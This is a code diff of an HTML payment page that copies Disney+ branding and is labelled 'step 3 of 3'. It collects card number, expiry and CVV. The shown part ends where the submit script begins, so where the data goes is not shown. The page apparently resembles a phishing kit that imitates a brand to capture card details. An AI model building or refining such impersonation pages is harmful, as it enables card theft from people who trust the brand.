@@ -5,18 +5,127 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Paiement | Disney+</title>
   <link rel="stylesheet" href="style.css" />
+  <style>
+    body {
+      margin: 0;
+      font-family: "Segoe UI", Roboto, system-ui, sans-serif;
+      background-image: url('Images/compose.png'); /* fond Disney */
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      min-height: 100vh;
+      color: white;
+      display: flex;
+      flex-direction: column;
+    }
+
+    header {
+      padding: 20px 40px;
+    }
+
+    .logo {
+      width: 180px;
+      max-width: 100%;
+    }
+
+    .form-container {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .progress {
+      font-size: 1rem;
+      margin-bottom: 8px;
+      color: #ccc;
+      text-align: center;
+    }
+
+    h1 {
+      margin-bottom: 15px;
+      font-size: 2.3rem;
+      text-align: center;
+      font-weight: 600;
+      text-shadow: 0 0 6px rgba(0, 0, 0, 0.6);
+    }
+
+    form {
+      background: rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      padding: 35px 25px;
+      border-radius: 12px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    input {
+      padding: 14px;
+      border-radius: 6px;
+      border: none;
+      font-size: 1rem;
+      background-color: #f1f1f1;
+      color: #111;
+    }
+
+    input:focus {
+      outline: 2px solid #0063e5;
+    }
+
+    input::placeholder {
+      color: #777;
+    }
+
+    button {
+      background-color: #0063e5;
+      color: white;
+      padding: 14px;
+      border: none;
+      border-radius: 6px;
+      font-size: 1rem;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #0483ee;
+    }
+
+    @media (max-width: 480px) {
+      h1 {
+        font-size: 2rem;
+      }
+
+      form {
+        padding: 30px 20px;
+      }
+    }
+  </style>
 </head>
 <body>
-  <header><img src="Images/logo-disney.png" class="logo" /></header>
+  <header>
+    <img src="Images/compose2.png" class="logo" alt="Disney+" />
+  </header>
+
   <main class="form-container">
+    <div class="progress">Étape 3 sur 3</div>
     <h1>Informations bancaires</h1>
     <form id="paymentForm">
-      <input type="text" placeholder="Numéro de carte" required />
-      <input type="text" placeholder="MM/AA" required />
-      <input type="text" placeholder="CVV" required />
+      <input type="text" placeholder="Numéro de carte" maxlength="19" required />
+      <input type="text" placeholder="MM/AA" pattern="\d{2}/\d{2}" required />
+      <input type="text" placeholder="CVV" maxlength="4" required />
       <button type="submit">Payer</button>
     </form>
   </main>
+
   <script>
     document.getElementById('paymentForm').addEventListener('submit', function(e) {
       e.preventDefault();
